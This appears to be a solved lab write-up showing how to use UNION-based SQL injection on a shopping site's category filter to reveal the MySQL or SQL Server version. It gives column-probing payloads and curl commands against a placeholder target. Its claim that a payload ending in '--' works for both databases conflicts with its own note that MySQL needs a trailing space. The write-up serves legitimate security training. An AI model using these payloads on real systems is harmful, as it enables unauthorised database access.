# SQL injection attack, querying the database type and version on MySQL and Microsoft — Practitioner

**Status:** Solved

---

## Goal

Exploit a SQL injection vulnerability to determine the database version. This lab uses either MySQL or Microsoft SQL Server, and you need to display the database version string.

---

## Steps (simple & complete)

1. **Find the injection point**
   - Browse to the shopping application
   - Click on any product category:
```
   GET /filter?category=Gifts
```
   - This parameter is vulnerable to SQL injection

2. **Test for SQL injection**
   - Try basic injection:
```
   /filter?category=Gifts'
```
   - You should get an error or unusual behavior

3. **Determine the number of columns**
   - Use ORDER BY to find column count:
```
   Gifts' ORDER BY 1--
   Gifts' ORDER BY 2--
   Gifts' ORDER BY 3--
```
   - Keep increasing until you get an error
   - Or use UNION SELECT with NULLs:
```
   Gifts' UNION SELECT NULL--
   Gifts' UNION SELECT NULL,NULL--
```
   - Let's say it works with 2 columns

4. **Find string-compatible columns**
   - Replace NULL with string to find which columns accept text:
```
   Gifts' UNION SELECT 'abc',NULL--
   Gifts' UNION SELECT NULL,'abc'--
```
   - Find which positions display strings without errors

5. **Determine if it's MySQL or MSSQL**
   - Try MySQL comment syntax first:
```
   Gifts' UNION SELECT NULL,NULL#
```
   - If that works, it's likely MySQL
   - If not, use `--` (works for both)

6. **Extract database version**
   - For MySQL:
```
   Gifts' UNION SELECT @@version,NULL#
```
   - For Microsoft SQL Server:
```
   Gifts' UNION SELECT @@version,NULL--
```
   - Both databases use `@@version` to get version info

7. **Execute the injection**
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+@@version,NULL--"
```
   - Or with MySQL comment:
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+@@version,NULL%23"
```

8. **Verify success**
   - The database version will be displayed on the page
   - MySQL shows: "5.7.32-0ubuntu..." or similar
   - MSSQL shows: "Microsoft SQL Server 2019..." or similar
   - Lab automatically solves once version is displayed

---

## Example

- Vulnerable endpoint: `GET /filter?category=Gifts`
- Column enumeration:
```
Gifts' ORDER BY 1--
Gifts' ORDER BY 2--
Gifts' ORDER BY 3-- (error = 2 columns)
```
- Final payload (works for both):
```bash
curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+@@version,NULL--"
```
- MySQL specific:
```bash
curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+@@version,NULL%23"
```

---

## MySQL vs MSSQL differences

**MySQL:**
- Comment: `#` or `-- ` (note the space after dashes)
- Version: `@@version` or `VERSION()`
- String concat: `CONCAT('a','b')`

**Microsoft SQL Server:**
- Comment: `--` (space after is recommended)
- Version: `@@version`
- String concat: `'a'+'b'`

**Both support:**
- `@@version` for version info
- `--` for comments (safer choice)
- `UNION SELECT` syntax

---

## Why this works

The `@@version` is a system variable available in both MySQL and Microsoft SQL Server that returns the database version information. By using UNION SELECT, we can inject this system variable into our query results and have it displayed alongside the product information. The key is matching the number of columns and ensuring at least one column can handle string data.

---

